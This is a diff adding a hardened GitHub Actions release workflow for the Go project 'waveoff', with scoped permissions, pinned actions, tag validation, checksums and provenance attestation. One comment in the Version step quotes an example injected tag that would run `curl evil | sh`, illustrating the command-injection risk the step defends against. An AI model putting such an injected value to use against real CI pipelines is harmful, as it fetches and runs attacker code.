@@ -1,0 +1,125 @@
+name: release
+
+on:
+  push:
+    tags: ["v*"]
+  workflow_dispatch:
+    inputs:
+      tag:
+        description: "Tag to build (for a dry run)"
+        required: true
+
+# No workflow-level grant. Each job asks for what it needs and nothing else, so
+# a step that is compromised holds a token that can only do that job's work.
+permissions: {}
+
+jobs:
+  binaries:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write      # create the release and upload artefacts
+      id-token: write      # OIDC, for the build provenance attestation
+      attestations: write  # record the attestation against this repository
+    steps:
+      - uses: actions/checkout@11d5960a326750d5838078e36cf38b85af677262 # ratchet:actions/checkout@v4
+        with:
+          fetch-depth: 0
+          # Do not leave the token in .git/config. Nothing here pushes — the
+          # release is created through an explicit GH_TOKEN below — and a
+          # credential sitting in the working tree is readable by every later
+          # step, including anything a dependency drags in.
+          persist-credentials: false
+      - uses: actions/setup-go@40f1582b2485089dde7abd97c1529aa768e1baff # ratchet:actions/setup-go@v5
+        with:
+          go-version-file: go.mod
+          cache: true
+
+      - name: Version
+        id: v
+        # The input arrives through the environment, never interpolated into
+        # the script. A `${{ }}` expansion inside a run block is textual
+        # substitution before the shell ever sees it, so a tag like
+        # `x"; curl evil | sh; #` would execute — and a tag containing a
+        # newline could forge extra entries in $GITHUB_OUTPUT.
+        #
+        # workflow_dispatch already needs write access, so this is not the
+        # first line of defence. It is the one that matters if the first fails:
+        # this job can create releases and sign attestations.
+        env:
+          INPUT_TAG: ${{ github.event.inputs.tag }}
+        run: |
+          set -euo pipefail
+          version="${GITHUB_REF_NAME:-$INPUT_TAG}"
+          # Shape-checked rather than trusted. Anything that is not a version
+          # tag has no business naming a release artefact.
+          if [[ ! "$version" =~ ^v[0-9]+\.[0-9]+\.[0-9]+(-[0-9A-Za-z.-]+)?$ ]]; then
+            echo "refusing to build '$version': not a semantic version tag" >&2
+            exit 1
+          fi
+          echo "version=$version" >> "$GITHUB_OUTPUT"
+
+      # The release must be built from a tree that passes its own checks. A
+      # broken binary is worse than a late one.
+      - name: Verify
+        run: |
+          make lint-boundary
+          make check-namespace
+          make test-unit
+          make verify-samples
+
+      - name: Build
+        env:
+          VERSION: ${{ steps.v.outputs.version }}
+        run: |
+          set -euo pipefail
+          mkdir -p dist
+          for target in darwin/amd64 darwin/arm64 linux/amd64 linux/arm64 windows/amd64; do
+            os=${target%/*}; arch=${target#*/}
+            ext=""; [ "$os" = windows ] && ext=".exe"
+            out="dist/waveoff-${os}-${arch}${ext}"
+            CGO_ENABLED=0 GOOS=$os GOARCH=$arch go build \
+              -trimpath \
+              -ldflags "-s -w -X github.com/waveoffai/waveoff/internal/cli.Version=${VERSION} -X github.com/waveoffai/waveoff/internal/cli.Commit=${GITHUB_SHA}" \
+              -o "$out" ./cmd/waveoff
+            tar -czf "dist/waveoff_${VERSION}_${os}_${arch}.tar.gz" -C dist "$(basename "$out")"
+            rm "$out"
+          done
+          # Checksums are not decoration here. Air-gapped and regulated users
+          # are the ones most likely to run this, and they verify downloads.
+          cd dist && sha256sum *.tar.gz > "waveoff_${VERSION}_SHA256SUMS"
+
+      - name: Rendered install manifest
+        env:
+          VERSION: ${{ steps.v.outputs.version }}
+        run: |
+          # A single self-contained YAML so `kubectl apply -f <url>` works
+          # without cloning the repo or having kustomize installed.
+          kubectl kustomize config/default > "dist/waveoff-${VERSION}.yaml"
+          kubectl kustomize config/crd > "dist/waveoff-crds-${VERSION}.yaml"
+
+      # Provenance, signed by GitHub's OIDC identity and recorded in a public
+      # transparency log. A SHA256SUMS file proves an archive was not corrupted
+      # in transit; it proves nothing about who built it, and it is served from
+      # the same place as the archives, so anyone who can replace one can
+      # replace both. An attestation says which workflow, at which commit,
+      # produced these bytes — which is the claim this project makes about
+      # agent images and should be able to make about itself.
+      #
+      #   gh attestation verify waveoff_v0.1.0_linux_amd64.tar.gz \
+      #     --repo waveoffai/waveoff
+      - name: Attest build provenance
+        if: startsWith(github.ref, 'refs/tags/v')
+        uses: actions/attest-build-provenance@e8998f949152b193b063cb0ec769d69d929409be # ratchet:actions/attest-build-provenance@v2
+        with:
+          subject-path: dist/*.tar.gz
+
+      - uses: actions/upload-artifact@ea165f8d65b6e75b540449e92b4886f43607fa02 # ratchet:actions/upload-artifact@v4
+        with:
+          name: dist
+          path: dist/
+
+      - name: Publish
+        if: startsWith(github.ref, 'refs/tags/v')
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: gh release create "$GITHUB_REF_NAME" dist/* --generate-notes --verify-tag
